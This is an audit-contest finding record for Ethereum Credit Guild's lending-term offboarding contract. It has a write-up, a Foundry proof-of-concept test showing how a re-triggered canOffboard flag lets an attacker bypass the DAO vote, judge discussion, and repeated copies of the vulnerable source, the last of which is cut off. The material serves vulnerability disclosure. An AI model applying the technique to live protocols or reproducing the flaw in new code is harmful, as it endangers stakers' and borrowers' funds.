{
  "Title": "[M-06] Re-triggering the `canOffboard[term]` flag to bypass the DAO vote of the lending term offboarding mechanism",
  "Content": "\nThe `LendingTermOffboarding` contract allows guild holders to poll to remove a lending term. If the voting weight is enough, the lending term can be offboarded without delay. Further, the offboarded term can be re-onboarded to become an active term through the `LendingTermOnboarding::proposeOnboard()` following up with the voting mechanism.\n\nThe following briefly describes the steps for offboarding the lending term through the `LendingTermOffboarding` contract:\n\n1. Anyone executes the `proposeOffboard()` to create a poll for offboarding the term. The poll has an age of `~7 days`.\n2. Guild holders cast votes for offboarding the term via `supportOffboard()`.\n3. If the poll has not ended and the voting weight is enough, the `canOffboard[term]` flag will be set.\n4. If the `canOffboard[term]` flag is set; anyone can execute the `offboard()` to offboard the term.\n5. All loans of the offboarded term have to be called and closed.\n6. After all loans have been closed, the `cleanup()` can be invoked to explicitly terminate the term and reset the `canOffboard[term]` flag.\n\nThe following roughly describes the steps for re-onboarding the offboarded lending term through the `LendingTermOnboarding` contract:\n\n1. The offboarded term can be proposed for re-onboarding through the `proposeOnboard()`.\n2. Guild holders cast votes for the term.\n3. If the vote is successful, the term re-onboarding operation is queued in the Timelock.\n4. After the Timelock delay, the term can be re-onboarded to become an active lending term again.\n\n### Vulnerability Details\n\nThis report describes the vulnerability in the `LendingTermOffboarding` contract, allowing an attacker to force the re-onboarded lending term to offboard by overriding the DAO vote offboarding mechanism. In other words, the attacker is not required to create an offboarding poll and wait for the vote to succeed in offboarding the target term.\n\nThe following explains the attack steps:\n\n1. As per steps 1 - 6 for offboarding the lending term previously described above, the lending term will be offboarded (via the `offboard()`) and cleaned up (via the `cleanup()`). The `cleanup()` will [reset the `canOffboard[term]` flag](https://github.com/code-423n4/2023-12-ethereumcreditguild/blob/2376d9af792584e3d15ec9c32578daa33bb56b43/src/governance/LendingTermOffboarding.sol#L197) so that no one can execute the `offboard()` or `cleanup()` on the terminated term again.\n2. However, the offboarding poll has [an age of `~7 days`](https://github.com/code-423n4/2023-12-ethereumcreditguild/blob/2376d9af792584e3d15ec9c32578daa33bb56b43/src/governance/LendingTermOffboarding.sol#L120-L123). As long as the poll has not ended, an attacker can execute the `supportOffboard()` to cast a vote to [re-trigger the `canOffboard[term]` flag](https://github.com/code-423n4/2023-12-ethereumcreditguild/blob/2376d9af792584e3d15ec9c32578daa33bb56b43/src/governance/LendingTermOffboarding.sol#L138-L140).\n3. Assuming that the target offboarded term has been proposed and successfully granted for re-onboarding (see steps 1 - 4 previously described above for re-onboarding the offboarded lending term).\n4. The attacker can force offboarding the target re-onboarded term, overriding the DAO vote offboarding mechanism by [invoking the `offboard()`](https://github.com/code-423n4/2023-12-ethereumcreditguild/blob/2376d9af792584e3d15ec9c32578daa33bb56b43/src/governance/LendingTermOffboarding.sol#L154) since the `canOffboard[term]` flag has been re-triggered in step 2.\n\nAfter successfully re-triggering the `canOffboard[term]` flag in step 2, the attacker can suddenly offboard the target re-onboarded term whenever they will, regardless of how long the target term has been re-onboarded, how long the offboarding poll has expired, or how long the `canOffboard[term]` flag has been re-triggered (please refer to the `Proof of Concept` section for the coded PoC).\n\n<details>\n\n```solidity\n    function cleanup(address term) external whenNotPaused {\n        require(canOffboard[term], \"LendingTermOffboarding: quorum not met\");\n        require(\n            LendingTerm(term).issuance() == 0,\n            \"LendingTermOffboarding: not all loans closed\"\n        );\n        require(\n            GuildToken(guildToken).isDeprecatedGauge(term),\n            \"LendingTermOffboarding: re-onboarded\"\n        );\n\n        // update protocol config\n        core().revokeRole(CoreRoles.RATE_LIMITED_CREDIT_MINTER, term);\n        core().revokeRole(CoreRoles.GAUGE_PNL_NOTIFIER, term);\n\n        // unpause psm redemptions\n        if (\n            --nOffboardingsInProgress == 0 && SimplePSM(psm).redemptionsPaused()\n        ) {\n            SimplePSM(psm).setRedemptionsPaused(false);\n        }\n\n@1      canOffboard[term] = false; //@audit -- After all offboarded term's loans have been closed, the cleanup() can be executed to explicitly clean up the term and reset the canOffboard[term] flag\n        emit Cleanup(block.timestamp, term);\n    }\n\n    function supportOffboard(\n        uint256 snapshotBlock,\n        address term\n    ) external whenNotPaused {\n@2      require(\n@2          block.number <= snapshotBlock + POLL_DURATION_BLOCKS, //@audit -- The lending term offboarding poll has an age of ~7 days\n@2          \"LendingTermOffboarding: poll expired\"\n@2      );\n        uint256 _weight = polls[snapshotBlock][term];\n        require(_weight != 0, \"LendingTermOffboarding: poll not found\");\n        uint256 userWeight = GuildToken(guildToken).getPastVotes(\n            msg.sender,\n            snapshotBlock\n        );\n        require(userWeight != 0, \"LendingTermOffboarding: zero weight\");\n        require(\n            userPollVotes[msg.sender][snapshotBlock][term] == 0,\n            \"LendingTermOffboarding: already voted\"\n        );\n\n        userPollVotes[msg.sender][snapshotBlock][term] = userWeight;\n        polls[snapshotBlock][term] = _weight + userWeight;\n@3      if (_weight + userWeight >= quorum) {\n@3          canOffboard[term] = true; //@audit -- Attacker can cast a vote to re-trigger the canOffboard[term] flag\n@3      }\n        emit OffboardSupport(\n            block.timestamp,\n            term,\n            snapshotBlock,\n            msg.sender,\n            userWeight\n        );\n    }\n\n    function offboard(address term) external whenNotPaused {\n@4      require(canOffboard[term], \"LendingTermOffboarding: quorum not met\"); //@audit -- Attacker can force offboarding the re-onboarded term, overriding the DAO vote offboarding mechanism\n\n        // update protocol config\n        // this will revert if the term has already been offboarded\n        // through another mean.\n        GuildToken(guildToken).removeGauge(term);\n\n        // pause psm redemptions\n        if (\n            nOffboardingsInProgress++ == 0 &&\n            !SimplePSM(psm).redemptionsPaused()\n        ) {\n            SimplePSM(psm).setRedemptionsPaused(true);\n        }\n\n        emit Offboard(block.timestamp, term);\n    }\n```\n\n</details>\n\n`@1 - After all offboarded term's loans have been closed, the cleanup() can be executed to explicitly clean up the term and reset the canOffboard[term] flag`: See [here](<https://github.com/code-423n4/2023-12-ethereumcreditguild/blob/2376d9af792584e3d15ec9c32578daa33bb56b43/src/governance/LendingTermOffboarding.sol#L197>).\n\n`@2 - The lending term offboarding poll has an age of ~7 days`: See [here](<https://github.com/code-423n4/2023-12-ethereumcreditguild/blob/2376d9af792584e3d15ec9c32578daa33bb56b43/src/governance/LendingTermOffboarding.sol#L120-L123>).\n\n`@3 - Attacker can cast a vote to re-trigger the canOffboard[term] flag`: See [here](<https://github.com/code-423n4/2023-12-ethereumcreditguild/blob/2376d9af792584e3d15ec9c32578daa33bb56b43/src/governance/LendingTermOffboarding.sol#L138-L140>).\n\n`@4 - Attacker can force offboarding the re-onboarded term, overriding the DAO vote offboarding mechanism`: See [here](<https://github.com/code-423n4/2023-12-ethereumcreditguild/blob/2376d9af792584e3d15ec9c32578daa33bb56b43/src/governance/LendingTermOffboarding.sol#L154>).\n\n### Impact\n\nThe active re-onboarded lending term can be forced to immediately offboard, bypassing the DAO vote offboarding, which is the protocol's core mechanism. Subsequently, the attacked lending term will block all new loans from being issued and prevent guild holders from voting for the term.\n\nMoreover, all loans previously issued by the attacked term can be called putting the loans for bidding silently (since the attacker bypasses the DAO vote offboarding mechanism). If one of the loans fails on bidding to fill up the loan's principal, the [term's loss will be notified](https://github.com/code-423n4/2023-12-ethereumcreditguild/blob/2376d9af792584e3d15ec9c32578daa33bb56b43/src/loan/LendingTerm.sol#L797). As a result, all users who stake credit tokens through the `SurplusGuildMinter` contract to vote for the attacked term will [be slashed with all their credit principal and guild rewards](https://github.com/code-423n4/2023-12-ethereumcreditguild/blob/2376d9af792584e3d15ec9c32578daa33bb56b43/src/loan/SurplusGuildMinter.sol#L228-L231).\n\n### Proof of Concept\n\nPlace the `testPoCBreakingDaoVoteOffboarding()` in the `.test/unit/governance/LendingTermOffboarding.t.sol` file and run the test using the `forge test --match-test testPoCBreakingDaoVoteOffboarding -vvv` command:\n\n<details>\n\n```solidity\nfunction testPoCBreakingDaoVoteOffboarding() public {\n    // Prepare for Attacker\n    address Attacker = address(1);\n    guild.mint(Attacker, 1);\n    vm.prank(Attacker);\n    guild.delegate(Attacker);\n\n    // Prepare for Bob\n    guild.mint(bob, _QUORUM);\n    vm.startPrank(bob);\n    guild.delegate(bob);\n\n    uint256 POLL_DURATION_BLOCKS = offboarder.POLL_DURATION_BLOCKS();\n    uint256 snapshotBlock = block.number;\n    uint256 OFFBOARDING_POLL_END_BLOCK = snapshotBlock + POLL_DURATION_BLOCKS;\n\n    // Bob proposes an offboarding of the term\n    assertEq(guild.isGauge(address(term)), true);\n    offboarder.proposeOffboard(address(term));\n\n    // Next 1 day\n    vm.roll(block.number + 6646); // 1 day\n    vm.warp(block.timestamp + 6646 * 13);\n    assertLe(block.number, OFFBOARDING_POLL_END_BLOCK);\n\n    vm.expectRevert(\"LendingTermOffboarding: quorum not met\");\n    offboarder.cleanup(address(term));\n\n    // Bob votes for offboarding the term and executes the offboarding (he has a sufficient voting weight)\n    assertEq(guild.isGauge(address(term)), true);\n    assertEq(offboarder.canOffboard(address(term)), false);\n    offboarder.supportOffboard(snapshotBlock, address(term));\n    offboarder.offboard(address(term));\n    assertEq(guild.isGauge(address(term)), false);\n    assertEq(offboarder.canOffboard(address(term)), true);\n\n    // Cannot clean up because loans are active\n    vm.expectRevert(\"LendingTermOffboarding: not all loans closed\");\n    offboarder.cleanup(address(term));\n\n    // Next 1 day\n    vm.roll(block.number + 6646); // 1 day\n    vm.warp(block.timestamp + 6646 * 13);\n    assertLe(block.number, OFFBOARDING_POLL_END_BLOCK);\n\n    // Get enough CREDIT to pack back interests\n    vm.stopPrank();\n    uint256 debt = term.getLoanDebt(aliceLoanId);\n    credit.mint(alice, debt - aliceLoanSize);\n\n    // Alice closes loan\n    vm.startPrank(alice);\n    credit.approve(address(term), debt);\n    term.repay(aliceLoanId);\n    vm.stopPrank();\n\n    // Clean up the term\n    assertEq(psm.redemptionsPaused(), true);\n    assertEq(offboarder.nOffboardingsInProgress(), 1);\n    offboarder.cleanup(address(term));\n    assertEq(psm.redemptionsPaused(), false);\n    assertEq(offboarder.nOffboardingsInProgress(), 0);\n\n    assertEq(offboarder.canOffboard(address(term)), false); // The canOffboard[term] flag has been reset\n    assertEq(core.hasRole(CoreRoles.RATE_LIMITED_CREDIT_MINTER, address(term)), false);\n    assertEq(core.hasRole(CoreRoles.GAUGE_PNL_NOTIFIER, address(term)), false);\n\n    // Attacker votes for offboarding the term to re-trigger the canOffboard[term] flag again\n    vm.startPrank(Attacker);\n    assertEq(offboarder.canOffboard(address(term)), false);\n    offboarder.supportOffboard(snapshotBlock, address(term));\n    assertEq(offboarder.canOffboard(address(term)), true); // Attacker has re-triggered the canOffboard[term] flag\n    vm.stopPrank();\n\n    // Next 10 days\n    // Offboarding poll expired\n    vm.roll(block.number + 66460); // 10 days\n    vm.warp(block.timestamp + 66460 * 13);\n    assertGt(block.number, OFFBOARDING_POLL_END_BLOCK);\n\n    // The term is re-onboarded\n    assertEq(guild.isGauge(address(term)), false);\n    guild.addGauge(1, address(term));\n    assertEq(guild.isGauge(address(term)), true);\n\n    // Next 30 days\n    vm.roll(block.number + 199380); // 30 days\n    vm.warp(block.timestamp + 199380 * 13);\n\n    assertEq(guild.isGauge(address(term)), true);\n    assertEq(psm.redemptionsPaused(), false);\n    assertEq(offboarder.nOffboardingsInProgress(), 0);\n\n    // Attacker offboards the term by overriding the DAO vote offboarding mechanism\n    vm.startPrank(Attacker);\n    offboarder.offboard(address(term));\n\n    assertEq(guild.isGauge(address(term)), false);\n    assertEq(psm.redemptionsPaused(), true);\n    assertEq(offboarder.nOffboardingsInProgress(), 1);\n}\n```\n\n</details>\n\n### Recommended Mitigation Steps\n\nImplement a proper mechanism for preventing the (active) lending term offboarding poll from re-triggering the `canOffboard[term]` flag, or deprecating the poll from further voting if the associated lending term has been cleaned up (via the `cleanup()`).\n\n**[eswak (Ethereum Credit Guild) confirmed, but disagreed with severity and commented](https://github.com/code-423n4/2023-12-ethereumcreditguild-findings/issues/1141#issuecomment-1888830203):**\n > Thanks for the very high quality report!\n> \n> Confirming this, but disagree with severity. I think medium is more fit for this, given the unlikely situation of re-onboarding a term that just has been offboarded, and that no user funds are at risk.\n\n**[TrungOre (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2023-12-ethereumcreditguild-findings/issues/1141#issuecomment-1910791806):**\n > I agree that this issue should be a med. Duplicating this for the issues that share the same root cause: missing update states for re-onboarded terms.\n\n**[serial-coder (warden) commented](https://github.com/code-423n4/2023-12-ethereumcreditguild-findings/issues/1141#issuecomment-1922852637):**\n > I disagree with the sponsor's statement.\n> \n> > **\"the unlikely situation of re-onboarding a term that just has been offboarded\"**\n> \n> The attack scenario described in this report does not rely on the situation that \"the term must be re-onboarded within only a few days after it has been offboarded\". Precisely, as long as the `cleanup()` is executed before the offboarding poll has ended, the attacker can execute the `supportOffboard()` to cast a vote to re-trigger the `canOffboard[term]` flag.\n> \n> The attacker can then wait for a long period (e.g., a couple of months) before attacking. The coded PoC proves that the target term can be re-onboarded after being off-boarded for 12 days (or even later), and the attacker can launch the attack operation (immediately offboard the target term) after the target term has re-onboarded for 30 days (or even later).\n> \n> > **\"no user funds are at risk\"**\n> \n> After re-triggering the `canOffboard[term]` flag, the attacker can wait for a long period before attacking (e.g., a couple of months -- *please thoroughly consider the coded PoC for the proof.*). In the meantime, after the target term has been re-onboarded, several GUILD holders can vote for it, and then the term can re-issue new loans.\n> \n> Once the attacker launches the attack operation, the target term will be forced to immediately offboard, bypassing the DAO vote offboarding.\n>\n> Clearly, the loan borrowers' funds and the stakers' funds are at risk.\n> \n> In other words, the attack will impact both borrowers (whose loans are forced to be called and closed maliciously) and stakers (who vote for the term via the `SurplusGuildMinter` contract will be slashed with all their CREDIT principal and GUILD rewards).\n> \n> The vulnerability also impacts the protocol by breaking the governance decision, which is a core feature of the protocol. For this reason, the HIGH severity is proper for this report.\n\n**[TrungOre (judge) commented](https://github.com/code-423n4/2023-12-ethereumcreditguild-findings/issues/1141#issuecomment-1932397064):**\n > I still keep medium severity for this issue, since it doesn't cause any direct loss. It could end up to locking funds in contracts, but funds can be still recovered by Governor.\n\n*Note: For full discussion, see [here](https://github.com/code-423n4/2023-12-ethereumcreditguild-findings/issues/1141).*\n\n***\n\n",
  "Impact": "MEDIUM",
  "Source": "https://code4rena.com/reports/2023-12-ethereumcreditguild",
  "Code": [
    {
      "filename": "src/governance/LendingTermOffboarding.sol",
      "content": "// SPDX-License-Identifier: MIT\npragma solidity 0.8.13;\n\nimport {CoreRef} from \"@src/core/CoreRef.sol\";\nimport {CoreRoles} from \"@src/core/CoreRoles.sol\";\nimport {SimplePSM} from \"@src/loan/SimplePSM.sol\";\nimport {GuildToken} from \"@src/tokens/GuildToken.sol\";\nimport {LendingTerm} from \"@src/loan/LendingTerm.sol\";\n\n/// @notice Utils to offboard a LendingTerm.\n/// This contract works somewhat similarly to a Veto governor: any GUILD holder can poll for the removal\n/// of a lending term, and if enough GUILD holders vote for a removal poll, the term can be offboarded\n/// without delay.\n/// When a term is offboarded, no new loans can be issued, and GUILD holders cannot vote for the term anymore.\n/// After a term is offboarded, all the loans have to be called, then the term can be cleaned up (roles).\ncontract LendingTermOffboarding is CoreRef {\n    /// @notice emitted when a user supports the removal of a lending term\n    event OffboardSupport(\n        uint256 indexed timestamp,\n        address indexed term,\n        uint256 indexed snapshotBlock,\n        address user,\n        uint256 userWeight\n    );\n    /// @notice emitted when a lending term is offboarded\n    event Offboard(uint256 indexed timestamp, address indexed term);\n    /// @notice emitted when a lending term is cleaned up\n    event Cleanup(uint256 indexed timestamp, address indexed term);\n\n    /// @notice Emitted when quorum is updated.\n    event QuorumUpdated(uint256 oldQuorum, uint256 newQuorum);\n\n    /// @notice maximum age of polls for them to be considered valid.\n    /// This offboarding mechanism is meant to be used in a reactive fashion, and\n    /// polls should not stay open for a long time.\n    uint256 public constant POLL_DURATION_BLOCKS = 46523; // ~7 days @ 13s/block\n\n    /// @notice quorum for offboarding a lending term\n    uint256 public quorum;\n\n    /// @notice reference to the GUILD token\n    address public immutable guildToken;\n\n    /// @notice reference to the PSM\n    address public immutable psm;\n\n    /// @notice list of removal polls created.\n    /// keys = [snapshotBlock][termAddress] -> quorum supporting the removal.\n    mapping(uint256 => mapping(address => uint256)) public polls;\n\n    /// @notice list of user votes in removal polls\n    /// keys = [userAddress][snapshotBlock][termAddress] -> user vote weight.\n    mapping(address => mapping(uint256 => mapping(address => uint256)))\n        public userPollVotes;\n\n    /// @notice block number of last removal polls created for each term.\n    /// key = [termAddress] -> block number.\n    mapping(address => uint256) public lastPollBlock;\n\n    /// @notice mapping of terms that can be offboarded.\n    mapping(address => bool) public canOffboard;\n\n    /// @notice number of offboardings in progress.\n    uint256 public nOffboardingsInProgress;\n\n    constructor(\n        address _core,\n        address _guildToken,\n        address _psm,\n        uint256 _quorum\n    ) CoreRef(_core) {\n        guildToken = _guildToken;\n        psm = _psm;\n        quorum = _quorum;\n    }\n\n    /// @notice set the quorum for offboard votes\n    function setQuorum(\n        uint256 _quorum\n    ) external onlyCoreRole(CoreRoles.GOVERNOR) {\n        emit QuorumUpdated(quorum, _quorum);\n        quorum = _quorum;\n    }\n\n    /// @notice Propose to offboard a given LendingTerm.\n    /// @dev the poll starts with 1 wei of voting power, to initialize the storage slot\n    /// that counts the number of user supports (a value of 0 is used as the existence\n    /// check to know if a poll has been created).\n    function proposeOffboard(address term) external whenNotPaused {\n        require(\n            polls[block.number][term] == 0,\n            \"LendingTermOffboarding: poll exists\"\n        );\n        require(\n            block.number > lastPollBlock[term] + POLL_DURATION_BLOCKS,\n            \"LendingTermOffboarding: poll active\"\n        );\n        // Check that the term is an active gauge\n        require(\n            GuildToken(guildToken).isGauge(term),\n            \"LendingTermOffboarding: not an active term\"\n        );\n\n        polls[block.number][term] = 1; // voting power\n        lastPollBlock[term] = block.number;\n        emit OffboardSupport(\n            block.timestamp,\n            term,\n            block.number,\n            address(0),\n            1\n        );\n    }\n\n    /// @notice Support a poll to offboard a given LendingTerm.\n    function supportOffboard(\n        uint256 snapshotBlock,\n        address term\n    ) external whenNotPaused {\n        require(\n            block.number <= snapshotBlock + POLL_DURATION_BLOCKS,\n            \"LendingTermOffboarding: poll expired\"\n        );\n        uint256 _weight = polls[snapshotBlock][term];\n        require(_weight != 0, \"LendingTermOffboarding: poll not found\");\n        uint256 userWeight = GuildToken(guildToken).getPastVotes(\n            msg.sender,\n            snapshotBlock\n        );\n        require(userWeight != 0, \"LendingTermOffboarding: zero weight\");\n        require(\n            userPollVotes[msg.sender][snapshotBlock][term] == 0,\n            \"LendingTermOffboarding: already voted\"\n        );\n\n        userPollVotes[msg.sender][snapshotBlock][term] = userWeight;\n        polls[snapshotBlock][term] = _weight + userWeight;\n        if (_weight + userWeight >= quorum) {\n            canOffboard[term] = true;\n        }\n        emit OffboardSupport(\n            block.timestamp,\n            term,\n            snapshotBlock,\n            msg.sender,\n            userWeight\n        );\n    }\n\n    /// @notice Offboard a LendingTerm.\n    /// This will prevent new loans from being open, and will prevent GUILD holders to vote for the term.\n    /// @param term LendingTerm to offboard from the system.\n    function offboard(address term) external whenNotPaused {\n        require(canOffboard[term], \"LendingTermOffboarding: quorum not met\");\n\n        // update protocol config\n        // this will revert if the term has already been offboarded\n        // through another mean.\n        GuildToken(guildToken).removeGauge(term);\n\n        // pause psm redemptions\n        if (\n            nOffboardingsInProgress++ == 0 &&\n            !SimplePSM(psm).redemptionsPaused()\n        ) {\n            SimplePSM(psm).setRedemptionsPaused(true);\n        }\n\n        emit Offboard(block.timestamp, term);\n    }\n\n    /// @notice Cleanup roles of a LendingTerm.\n    /// This is only callable after a term has been offboarded and all its loans have been closed.\n    /// @param term LendingTerm to cleanup.\n    function cleanup(address term) external whenNotPaused {\n        require(canOffboard[term], \"LendingTermOffboarding: quorum not met\");\n        require(\n            LendingTerm(term).issuance() == 0,\n            \"LendingTermOffboarding: not all loans closed\"\n        );\n        require(\n            GuildToken(guildToken).isDeprecatedGauge(term),\n            \"LendingTermOffboarding: re-onboarded\"\n        );\n\n        // update protocol config\n        core().revokeRole(CoreRoles.RATE_LIMITED_CREDIT_MINTER, term);\n        core().revokeRole(CoreRoles.GAUGE_PNL_NOTIFIER, term);\n\n        // unpause psm redemptions\n        if (\n            --nOffboardingsInProgress == 0 && SimplePSM(psm).redemptionsPaused()\n        ) {\n            SimplePSM(psm).setRedemptionsPaused(false);\n        }\n\n        canOffboard[term] = false;\n        emit Cleanup(block.timestamp, term);\n    }\n}"
    },
    {
      "filename": "src/governance/LendingTermOffboarding.sol",
      "content": "// SPDX-License-Identifier: MIT\npragma solidity 0.8.13;\n\nimport {CoreRef} from \"@src/core/CoreRef.sol\";\nimport {CoreRoles} from \"@src/core/CoreRoles.sol\";\nimport {SimplePSM} from \"@src/loan/SimplePSM.sol\";\nimport {GuildToken} from \"@src/tokens/GuildToken.sol\";\nimport {LendingTerm} from \"@src/loan/LendingTerm.sol\";\n\n/// @notice Utils to offboard a LendingTerm.\n/// This contract works somewhat similarly to a Veto governor: any GUILD holder can poll for the removal\n/// of a lending term, and if enough GUILD holders vote for a removal poll, the term can be offboarded\n/// without delay.\n/// When a term is offboarded, no new loans can be issued, and GUILD holders cannot vote for the term anymore.\n/// After a term is offboarded, all the loans have to be called, then the term can be cleaned up (roles).\ncontract LendingTermOffboarding is CoreRef {\n    /// @notice emitted when a user supports the removal of a lending term\n    event OffboardSupport(\n        uint256 indexed timestamp,\n        address indexed term,\n        uint256 indexed snapshotBlock,\n        address user,\n        uint256 userWeight\n    );\n    /// @notice emitted when a lending term is offboarded\n    event Offboard(uint256 indexed timestamp, address indexed term);\n    /// @notice emitted when a lending term is cleaned up\n    event Cleanup(uint256 indexed timestamp, address indexed term);\n\n    /// @notice Emitted when quorum is updated.\n    event QuorumUpdated(uint256 oldQuorum, uint256 newQuorum);\n\n    /// @notice maximum age of polls for them to be considered valid.\n    /// This offboarding mechanism is meant to be used in a reactive fashion, and\n    /// polls should not stay open for a long time.\n    uint256 public constant POLL_DURATION_BLOCKS = 46523; // ~7 days @ 13s/block\n\n    /// @notice quorum for offboarding a lending term\n    uint256 public quorum;\n\n    /// @notice reference to the GUILD token\n    address public immutable guildToken;\n\n    /// @notice reference to the PSM\n    address public immutable psm;\n\n    /// @notice list of removal polls created.\n    /// keys = [snapshotBlock][termAddress] -> quorum supporting the removal.\n    mapping(uint256 => mapping(address => uint256)) public polls;\n\n    /// @notice list of user votes in removal polls\n    /// keys = [userAddress][snapshotBlock][termAddress] -> user vote weight.\n    mapping(address => mapping(uint256 => mapping(address => uint256)))\n        public userPollVotes;\n\n    /// @notice block number of last removal polls created for each term.\n    /// key = [termAddress] -> block number.\n    mapping(address => uint256) public lastPollBlock;\n\n    /// @notice mapping of terms that can be offboarded.\n    mapping(address => bool) public canOffboard;\n\n    /// @notice number of offboardings in progress.\n    uint256 public nOffboardingsInProgress;\n\n    constructor(\n        address _core,\n        address _guildToken,\n        address _psm,\n        uint256 _quorum\n    ) CoreRef(_core) {\n        guildToken = _guildToken;\n        psm = _psm;\n        quorum = _quorum;\n    }\n\n    /// @notice set the quorum for offboard votes\n    function setQuorum(\n        uint256 _quorum\n    ) external onlyCoreRole(CoreRoles.GOVERNOR) {\n        emit QuorumUpdated(quorum, _quorum);\n        quorum = _quorum;\n    }\n\n    /// @notice Propose to offboard a given LendingTerm.\n    /// @dev the poll starts with 1 wei of voting power, to initialize the storage slot\n    /// that counts the number of user supports (a value of 0 is used as the existence\n    /// check to know if a poll has been created).\n    function proposeOffboard(address term) external whenNotPaused {\n        require(\n            polls[block.number][term] == 0,\n            \"LendingTermOffboarding: poll exists\"\n        );\n        require(\n            block.number > lastPollBlock[term] + POLL_DURATION_BLOCKS,\n            \"LendingTermOffboarding: poll active\"\n        );\n        // Check that the term is an active gauge\n        require(\n            GuildToken(guildToken).isGauge(term),\n            \"LendingTermOffboarding: not an active term\"\n        );\n\n        polls[block.number][term] = 1; // voting power\n        lastPollBlock[term] = block.number;\n        emit OffboardSupport(\n            block.timestamp,\n            term,\n            block.number,\n            address(0),\n            1\n        );\n    }\n\n    /// @notice Support a poll to offboard a given LendingTerm.\n    function supportOffboard(\n        uint256 snapshotBlock,\n        address term\n    ) external whenNotPaused {\n        require(\n            block.number <= snapshotBlock + POLL_DURATION_BLOCKS,\n            \"LendingTermOffboarding: poll expired\"\n        );\n        uint256 _weight = polls[snapshotBlock][term];\n        require(_weight != 0, \"LendingTermOffboarding: poll not found\");\n        uint256 userWeight = GuildToken(guildToken).getPastVotes(\n            msg.sender,\n            snapshotBlock\n        );\n        require(userWeight != 0, \"LendingTermOffboarding: zero weight\");\n        require(\n            userPollVotes[msg.sender][snapshotBlock][term] == 0,\n            \"LendingTermOffboarding: already voted\"\n        );\n\n        userPollVotes[msg.sender][snapshotBlock][term] = userWeight;\n        polls[snapshotBlock][term] = _weight + userWeight;\n        if (_weight + userWeight >= quorum) {\n            canOffboard[term] = true;\n        }\n        emit OffboardSupport(\n            block.timestamp,\n            term,\n            snapshotBlock,\n            msg.sender,\n            userWeight\n        );\n    }\n\n    /// @notice Offboard a LendingTerm.\n    /// This will prevent new loans from being open, and will prevent GUILD holders to vote for the term.\n    /// @param term LendingTerm to offboard from the system.\n    function offboard(address term) external whenNotPaused {\n        require(canOffboard[term], \"LendingTermOffboarding: quorum not met\");\n\n        // update protocol config\n        // this will revert if the term has already been offboarded\n        // through another mean.\n        GuildToken(guildToken).removeGauge(term);\n\n        // pause psm redemptions\n        if (\n            nOffboardingsInProgress++ == 0 &&\n            !SimplePSM(psm).redemptionsPaused()\n        ) {\n            SimplePSM(psm).setRedemptionsPaused(true);\n        }\n\n        emit Offboard(block.timestamp, term);\n    }\n\n    /// @notice Cleanup roles of a LendingTerm.\n    /// This is only callable after a term has been offboarded and all its loans have been closed.\n    /// @param term LendingTerm to cleanup.\n    function cleanup(address term) external whenNotPaused {\n        require(canOffboard[term], \"LendingTermOffboarding: quorum not met\");\n        require(\n            LendingTerm(term).issuance() == 0,\n            \"LendingTermOffboarding: not all loans closed\"\n        );\n        require(\n            GuildToken(guildToken).isDeprecatedGauge(term),\n            \"LendingTermOffboarding: re-onboarded\"\n        );\n\n        // update protocol config\n        core().revokeRole(CoreRoles.RATE_LIMITED_CREDIT_MINTER, term);\n        core().revokeRole(CoreRoles.GAUGE_PNL_NOTIFIER, term);\n\n        // unpause psm redemptions\n        if (\n            --nOffboardingsInProgress == 0 && SimplePSM(psm).redemptionsPaused()\n        ) {\n            SimplePSM(psm).setRedemptionsPaused(false);\n        }\n\n        canOffboard[term] = false;\n        emit Cleanup(block.timestamp, term);\n    }\n}"
    },
    {
      "filename": "src/governance/LendingTermOffboarding.sol",
      "content": "// SPDX-License-Identifier: MIT\npragma solidity 0.8.13;\n\nimport {CoreRef} from \"@src/core/CoreRef.sol\";\nimport {CoreRoles} from \"@src/core/CoreRoles.sol\";\nimport {SimplePSM} from \"@src/loan/SimplePSM.sol\";\nimport {GuildToken} from \"@src/tokens/GuildToken.sol\";\nimport {LendingTerm} from \"@src/loan/LendingTerm.sol\";\n\n/// @notice Utils to offboard a LendingTerm.\n/// This contract works somewhat similarly to a Veto governor: any GUILD holder can poll for the removal\n/// of a lending term, and if enough GUILD holders vote for a removal poll, the term can be offboarded\n/// without delay.\n/// When a term is offboarded, no new loans can be issued, and GUILD holders cannot vote for the term anymore.\n/// After a term is offboarded, all the loans have to be called, then the term can be cleaned up (roles).\ncontract LendingTermOffboarding is CoreRef {\n    /// @notice emitted when a user supports the removal of a lending term\n    event OffboardSupport(\n        uint256 indexed timestamp,\n        address indexed term,\n        uint256 indexed snapshotBlock,\n        address user,\n        uint256 userWeight\n    );\n    /// @notice emitted when a lending term is offboarded\n    event Offboard(uint256 indexed timestamp, address indexed term);\n    /// @notice emitted when a lending term is cleaned up\n    event Cleanup(uint256 indexed timestamp, address indexed term);\n\n    /// @notice Emitted when quorum is updated.\n    event QuorumUpdated(uint256 oldQuorum, uint256 newQuorum);\n\n    /// @notice maximum age of polls for them to be considered valid.\n    /// This offboarding mechanism is meant to be used in a reactive fashion, and\n    /// polls should not stay open for a long time.\n    uint256 public constant POLL_DURATION_BLOCKS = 46523; // ~7 days @ 13s/block\n\n    /// @notice quorum for offboarding a lending term\n    uint256 public quorum;\n\n    /// @notice reference to the GUILD token\n    address public immutable guildToken;\n\n    /// @notice reference to the PSM\n    address public immutable psm;\n\n    /// @notice list of removal polls created.\n    /// keys = [snapshotBlock][termAddress] -> quorum supporting the removal.\n    mapping(uint256 => mapping(address => uint256)) public polls;\n\n    /// @notice list of user votes in removal polls\n    /// keys = [userAddress][snapshotBlock][termAddress] -> user vote weight.\n    mapping(address => mapping(uint256 => mapping(address => uint256)))\n        public userPollVotes;\n\n    /// @notice block number of last removal polls created for each term.\n    /// key = [termAddress] -> block number.\n    mapping(address => uint256) public lastPollBlock;\n\n    /// @notice mapping of terms that can be offboarded.\n    mapping(address => bool) public canOffboard;\n\n    /// @notice number of offboardings in progress.\n    uint256 public nOffboardingsInProgress;\n\n    constructor(\n        address _core,\n        address _guildToken,\n        address _psm,\n        uint256 _quorum\n    ) CoreRef(_core) {\n        guildToken = _guildToken;\n        psm = _psm;\n        quorum = _quorum;\n    }\n\n    /// @notice set the quorum for offboard votes\n    function setQuorum(\n        uint256 _quorum\n    ) external onlyCoreRole(CoreRoles.GOVERNOR) {\n        emit QuorumUpdated(quorum, _quorum);\n        quorum = _quorum;\n    }\n\n    /// @notice Propose to offboard a given LendingTerm.\n    /// @dev the poll starts with 1 wei of voting power, to initialize the storage slot\n    /// that counts the number of user supports (a value of 0 is used as the existence\n    /// check to know if a poll has been created).\n    function proposeOffboard(address term) external whenNotPaused {\n        require(\n            polls[block.number][term] == 0,\n            \"LendingTermOffboarding: poll 